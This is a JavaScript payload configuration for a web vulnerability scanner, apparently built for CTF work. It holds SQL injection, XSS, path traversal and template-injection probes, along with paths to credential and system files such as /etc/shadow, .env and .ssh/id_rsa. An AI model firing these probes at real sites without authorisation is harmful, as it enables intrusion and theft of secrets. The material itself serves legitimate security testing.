'use strict';

/**
 * Centralized payload configurations — all security test modules
 */

const PAYLOADS = {

  // ─── SQL Injection ────────────────────────────────────────────────────────
  sqli: {
    params: ['id', 'user', 'q', 'search', 'item', 'email', 'name', 'page', 'cat', 'product'],

    // Error-based payloads — trigger DB error messages
    error_payloads: [
      "' OR '1'='1",
      "' OR 1=1 --",
      "' OR 1=1 /*",
      "1' OR '1'='1",
      "' UNION SELECT NULL --",
      "' UNION SELECT 1,2,3 --",
      "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
      "admin'--",
      "1 OR 1=1",
      "' OR 'a'='a",
    ],

    // Time-based blind payloads — { payload, delay } in ms
    time_payloads: [
      { payload: "' AND SLEEP(5)-- -",              delay: 4800, db: 'MySQL'      },
      { payload: "1; WAITFOR DELAY '0:0:5'--",      delay: 4800, db: 'MSSQL'     },
      { payload: "'; SELECT pg_sleep(5)--",         delay: 4800, db: 'PostgreSQL' },
      { payload: "' OR SLEEP(5)-- -",               delay: 4800, db: 'MySQL'      },
      { payload: "1 AND 1=1 AND SLEEP(5)",          delay: 4800, db: 'MySQL'      },
    ],

    // Patterns indicating DB errors in response
    errorPatterns: [
      /SQL syntax.*MySQL|MySQL.*SQL syntax/i,
      /mysql_fetch_array|mysql_num_rows|mysql_result/i,
      /ORA-\d{5}:/i,
      /PostgreSQL.*ERROR|ERROR.*PostgreSQL/i,
      /Microsoft SQL Server|ODBC Driver.*SQL Server/i,
      /SQLite3::query|sqlite3_exec|SQLite Exception/i,
      /syntax error.*FROM|unclosed quotation mark/i,
      /DB2 SQL error|SQLCODE=/i,
      /Incorrect syntax near/i,
      /Unclosed quotation mark after the character string/i,
    ],
  },

  // ─── XSS ─────────────────────────────────────────────────────────────────
  xss: {
    params: ['q', 's', 'search', 'name', 'msg', 'cmd', 'user', 'comment', 'feedback', 'text'],
    payloads: [
      '<yhack>alert(1)</yhack>',
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      '<body onload=alert(1)>',
      '<input onfocus=alert(1) autofocus>',
      '"><script>alert(1)</script>',
      "'><img src=x onerror=alert(1)>",
      '<details open ontoggle=alert(1)>',
      '<iframe srcdoc="<script>alert(1)</script>">',
    ],
  },

  // ─── LFI ─────────────────────────────────────────────────────────────────
  lfi: {
    params: ['file', 'page', 'doc', 'view', 'path', 'include', 'load', 'template', 'lang'],
    paths: [
      '../../../../etc/passwd',
      '../../../etc/passwd',
      '../../etc/passwd',
      '../../../../etc/shadow',
      '../../../../etc/hosts',
      '../../../../proc/version',
      '../../../../windows/win.ini',
      '../../../../windows/system32/drivers/etc/hosts',
      '....//....//....//....//etc/passwd',
      '..\\..\\..\\..\\windows\\win.ini',
      'php://filter/convert.base64-encode/resource=/etc/passwd',
      'file:///etc/passwd',
    ],
    // Strict indicators — no false positives
    strictIndicators: [
      /root:x:0:0:/,
      /daemon:x:\d+:\d+:/,
      /\[extensions\]\s*\r?\n.*\bphp\b/i,
      /for 16-bit app support/i,
      /\[Mail\]\s*\r?\n/,
    ],
  },

  // ─── RCE ─────────────────────────────────────────────────────────────────
  rce: {
    params: ['cmd', 'exec', 'ping', 'query', 'ip', 'host', 'command', 'system', 'run', 'shell'],
  },

  // ─── SSTI ─────────────────────────────────────────────────────────────────
  ssti: {
    params: ['name', 'user', 'q', 'search', 'email', 'template', 'msg', 'lang'],
    tests: [
      { payload: '{{7*7}}',     expected: '49',  engine: 'Jinja2/Twig'    },
      { payload: '${7*7}',      expected: '49',  engine: 'Mako/Freemarker'},
      { payload: '<%= 7*7 %>',  expected: '49',  engine: 'ERB/EJS'        },
      { payload: '#{7*7}',      expected: '49',  engine: 'Ruby'           },
      { payload: '*{7*7}',      expected: '49',  engine: 'Spring SpEL'    },
      { payload: '{{7*\'7\'}}', expected: '7777777', engine: 'Jinja2'     },
    ],
  },

  // ─── Open Redirect ────────────────────────────────────────────────────────
  openRedirect: {
    params: ['url', 'next', 'target', 'dest', 'redirect', 'return_to', 'r', 'u', 'goto', 'return', 'continue'],
    marker: 'evil.yhack.test',
  },

  // ─── CORS ─────────────────────────────────────────────────────────────────
  cors: {
    testOrigin: 'https://evil.yhack.test',
  },

  // ─── Sensitive Files ──────────────────────────────────────────────────────
  sensitiveFiles: [
    '/.env',
    '/.env.local',
    '/.env.production',
    '/.env.backup',
    '/.git/config',
    '/.git/HEAD',
    '/.git/COMMIT_EDITMSG',
    '/.DS_Store',
    '/robots.txt',
    '/sitemap.xml',
    '/package.json',
    '/package-lock.json',
    '/composer.json',
    '/composer.lock',
    '/server-status',
    '/server-info',
    '/phpinfo.php',
    '/info.php',
    '/backup.sql',
    '/database.sql',
    '/db.sql',
    '/dump.sql',
    '/debug.log',
    '/error.log',
    '/.htaccess',
    '/.htpasswd',
    '/web.config',
    '/config.php',
    '/config.yml',
    '/config.yaml',
    '/wp-config.php',
    '/wp-config.php.bak',
    '/wp-login.php',
    '/admin/config.php',
    '/.ssh/id_rsa',
    '/id_rsa',
    '/Dockerfile',
    '/docker-compose.yml',
    '/docker-compose.yaml',
    '/nginx.conf',
    '/apache.conf',
    '/sftp-config.json',
  ],

  // ─── HTTP Methods ─────────────────────────────────────────────────────────
  httpMethods: {
    dangerous: [
      { method: 'TRACE',   risk: 'XST — récupération de cookies HttpOnly'           },
      { method: 'PUT',     risk: 'Upload de fichiers arbitraires → RCE'             },
      { method: 'DELETE',  risk: 'Suppression de ressources'                        },
      { method: 'OPTIONS', risk: 'Révèle les méthodes autorisées (info disclosure)' },
    ],
  },

  // ─── Flag patterns (CTF) ─────────────────────────────────────────────────
  flagPatterns: [
    /HTB\{[^}]+\}/gi,
    /flag\{[^}]+\}/gi,
    /YHACK\{[^}]+\}/gi,
    /FLAG\{[^}]+\}/gi,
    /CTF\{[^}]+\}/gi,
  ],
};

module.exports = { PAYLOADS };
